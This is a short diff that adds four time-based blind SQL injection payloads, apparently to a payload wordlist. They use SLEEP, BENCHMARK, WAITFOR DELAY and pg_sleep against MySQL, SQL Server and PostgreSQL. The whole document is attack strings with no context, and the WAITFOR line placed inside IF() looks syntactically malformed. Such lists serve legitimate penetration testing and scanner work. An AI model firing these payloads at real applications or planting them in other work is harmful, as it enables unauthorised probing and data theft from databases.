@@ -1,0 +1,4 @@
+' OR IF(1=1,SLEEP(5),0) --
+' OR IF(1=1,BENCHMARK(5000000,MD5('test')),0) --
+' OR IF(1=1,WAITFOR DELAY '0:0:5',0) --
+' OR IF(1=1,pg_sleep(5),0) --
